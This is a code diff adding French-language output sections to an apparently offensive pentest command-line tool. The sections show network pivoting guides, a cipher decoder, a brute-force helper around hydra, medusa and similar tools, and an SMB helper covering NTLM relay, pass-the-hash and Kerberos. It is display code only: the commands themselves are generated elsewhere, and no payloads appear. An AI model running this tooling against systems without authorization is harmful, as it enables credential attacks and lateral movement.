+        console.print(f"  SSH   : {'[green]ouvert[/green]' if pivot_result.ssh_available else '[dim]non détecté[/dim]'}")
+        if pivot_result.internal_nets:
+            console.print(f"  Réseaux internes : [yellow]{', '.join(pivot_result.internal_nets)}[/yellow]")
+
+        # Quick start
+        console.print(f"\n[bold]Quick start :[/bold]")
+        for line in pivot_result.quick_start.split("\n"):
+            if line.startswith("#"):
+                console.print(f"  [dim]{line}[/dim]")
+            elif line.strip():
+                console.print(f"  [green]{line}[/green]")
+
+        # Guides
+        for guide in pivot_result.guides:
+            tool_colors = {
+                "ligolo": "magenta", "chisel": "cyan",
+                "ssh": "blue", "socat": "yellow", "sshuttle": "green",
+            }
+            col = tool_colors.get(guide.tool, "white")
+            console.print(f"\n[bold {col}]── {guide.title}[/bold {col}]")
+            console.print(f"  [dim]{guide.description}[/dim]")
+
+            if guide.attacker:
+                console.print(f"  [dim]Côté attaquant :[/dim]")
+                for line in guide.attacker[:6]:
+                    if line.startswith("#"):
+                        console.print(f"  [dim]{line}[/dim]")
+                    elif line.strip():
+                        console.print(f"  [green]{line}[/green]")
+                    else:
+                        console.print("")
+
+            if guide.target:
+                console.print(f"  [dim]Côté cible :[/dim]")
+                for line in guide.target[:5]:
+                    if line.startswith("#"):
+                        console.print(f"  [dim]{line}[/dim]")
+                    elif line.strip():
+                        console.print(f"  [yellow]{line}[/yellow]")
+                    else:
+                        console.print("")
+
+            for note in guide.notes[:2]:
+                console.print(f"  [dim]• {note}[/dim]")
+
+        for note in pivot_result.notes:
+            console.print(f"\n  [dim]{note}[/dim]")
+
+        console.print(f"[bold cyan]{'='*62}[/bold cyan]\n")
+
+    # ── Cipher Decoder ────────────────────────────────────────────────────────
+    if args.cipher:
+        cipher_result = analyze_cipher(args.cipher)
+        console.print(f"\n[bold magenta]● Cipher Decoder[/bold magenta]")
+        console.print(f"  Input : [dim]{args.cipher[:80]}{'...' if len(args.cipher)>80 else ''}[/dim]")
+        console.print(f"  {cipher_result.summary}")
+
+        if cipher_result.best_guess:
+            bg = cipher_result.best_guess
+            conf_color = {"high": "green", "medium": "yellow", "low": "red"}.get(
+                bg.confidence, "white"
+            )
+            console.print(
+                f"\n  [bold]Meilleure hypothèse :[/bold] [{conf_color}]{bg.cipher_type}[/{conf_color}] "
+                f"(confiance : {bg.confidence})"
+            )
+            if bg.decoded and bg.decoded != "[non décodable directement — voir commande]":
+                preview = bg.decoded[:200].replace("\n", " ↵ ")
+                console.print(f"  [green]Décodé : {preview}[/green]")
+            console.print(f"\n  [dim]Commande :[/dim]")
+            for line in bg.decode_cmd.split("\n")[:5]:
+                if line.startswith("#"):
+                    console.print(f"  [dim]{line}[/dim]")
+                elif line.strip():
+                    console.print(f"  [green]{line}[/green]")
+            if bg.notes:
+                console.print(f"\n  [dim]{bg.notes[:200]}[/dim]")
+            if bg.cyberchef_url:
+                console.print(f"\n  [dim]CyberChef : {bg.cyberchef_url}[/dim]")
+
+        if len(cipher_result.detections) > 1:
+            other = [d for d in cipher_result.detections if d != cipher_result.best_guess]
+            console.print(f"\n  [dim]Autres détections : {', '.join(d.cipher_type for d in other)}[/dim]")
+
+    # ── Brute Force Helper ────────────────────────────────────────────────────
+    if args.brute:
+        brute_results = generate_brute_commands(results, target=target)
+        if not brute_results:
+            console.print("\n[dim]Aucun service bruteforçable détecté "
+                          "(SSH, FTP, HTTP, SMB, RDP, MySQL, etc.).[/dim]")
+        else:
+            console.print(f"\n[bold red]● Brute Force Helper[/bold red]")
+            for br in brute_results:
+                console.print(f"\n  [cyan]Host : {br.host}[/cyan]  "
+                               f"({len(br.commands)} commande(s))")
+                for cmd in br.commands:
+                    tool_colors = {
+                        "hydra": "green", "medusa": "cyan",
+                        "crackmapexec": "yellow", "ncrack": "blue",
+                    }
+                    col = tool_colors.get(cmd.tool, "white")
+                    console.print(f"\n  [{col}][{cmd.tool.upper()}][/{col}] {cmd.title}")
+                    console.print(f"  [green]{cmd.command.split(chr(10))[0]}[/green]")
+                    # Afficher la commande complète si multi-ligne
+                    lines = cmd.command.split("\n")
+                    for line in lines[1:]:
+                        if line.strip() and not line.startswith("#"):
+                            console.print(f"  [green]{line}[/green]")
+                        elif line.startswith("#"):
+                            console.print(f"  [dim]{line}[/dim]")
+                    for note in cmd.notes[:2]:
+                        console.print(f"  [dim]• {note}[/dim]")
+
+                for note in br.notes[:2]:
+                    console.print(f"\n  [dim]{note}[/dim]")
+
+    # ── SMB Helper ────────────────────────────────────────────────────────────
+    if args.smb:
+        smb_result = generate_smb_commands(results)
+        if smb_result is None:
+            console.print("\n[dim]Aucun service SMB détecté (ports 445/139).[/dim]")
+        else:
+            ctx = smb_result.context
+            console.print(f"\n[bold blue]{'='*62}[/bold blue]")
+            console.print(f"[bold blue]  SMB HELPER — {ctx.host}:{ctx.port}[/bold blue]")
+            console.print(f"[bold blue]{'='*62}[/bold blue]")
+            console.print(f"  Domaine  : [cyan]{ctx.domain}[/cyan]")
+            console.print(f"  Signing  : {'[red]DÉSACTIVÉ — relay possible[/red]' if not ctx.signing else '[green]activé[/green]'}")
+            if ctx.dc:
+                console.print(f"  Rôle     : [yellow]Contrôleur de domaine (Kerberos/LDAP détectés)[/yellow]")
+            for note in smb_result.notes:
+                if "⚠" in note:
+                    console.print(f"  [bold red]{note}[/bold red]")
+                else:
+                    console.print(f"  [dim]{note}[/dim]")
+
+            cat_sections = [
+                ("Null session", smb_result.null_session,    "blue"),
+                ("Énumération auth", smb_result.enumeration, "cyan"),
+                ("Impacket",    smb_result.impacket,         "yellow"),
+                ("Relay NTLM",  smb_result.relay,            "red"),
+                ("Pass-the-Hash", smb_result.pass_the_hash,  "magenta"),
+                ("Kerberos",    smb_result.kerberos,         "green"),
+            ]
+
+            for section_title, cmds, col in cat_sections:
+                if not cmds:
+                    continue
+                console.print(f"\n[bold {col}]── {section_title} ({len(cmds)} commande(s))[/bold {col}]")
+                for cmd in cmds:
+                    auth_tag = " [dim][auth requis][/dim]" if cmd.requires_auth else ""
+                    console.print(f"\n  [bold]{cmd.title}[/bold]{auth_tag}")
+                    console.print(f"  [dim]{cmd.description[:100]}[/dim]")
+                    for line in cmd.command.split("\n")[:6]:
+                        if line.startswith("#"):
+                            console.print(f"  [dim]{line}[/dim]")
+                        elif line.strip():
+                            console.print(f"  [green]{line}[/green]")
+                        else:
+                            console.print("")
+                    for note in cmd.notes[:2]:
+                        console.print(f"  [dim]• {note}[/dim]")
+
+            console.print(f"[bold blue]{'='*62}[/bold blue]\n")
 
 if __name__ == "__main__":
     main()
